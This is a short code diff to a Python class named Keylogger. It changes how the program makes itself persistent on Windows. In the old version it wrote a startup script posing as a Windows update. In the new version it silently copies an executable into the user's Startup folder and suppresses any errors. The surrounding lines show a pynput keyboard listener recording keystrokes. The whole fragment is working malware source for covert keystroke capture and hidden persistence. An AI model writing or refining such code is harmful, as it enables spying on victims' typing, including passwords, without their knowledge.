@@ -34,13 +34,10 @@ class Keylogger:
     def change_dir(self):
         try:
             username = getpass.getuser()
-            with open(fr'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\', 'w') as file:
-            # Write content to the file
-                file.write(f"""import os
-                os.system(E:\Windows_update.exe)""")
+            shutil.move(r"E:\start.exe", fr"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.exe")
             
         except Exception as e:
-            print("windows update failed")
+            pass
 
     def main(self):
         listener = pynput.keyboard.Listener(on_press=self.take_keys)
